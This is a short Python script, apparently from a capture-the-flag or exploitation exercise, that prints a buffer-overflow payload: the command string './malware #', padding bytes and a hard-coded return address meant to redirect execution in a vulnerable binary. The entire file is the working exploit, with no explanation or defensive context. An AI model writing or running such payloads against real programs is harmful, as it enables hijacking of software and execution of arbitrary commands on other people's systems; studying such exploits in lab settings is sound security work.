#!/usr/bin/env python3
import sys

payload = b"./malware #AAAAAAAAAAAAA\x6b\x1a\x40\x00\x00\x00\x00\x00"

sys.stdout.buffer.write(payload)
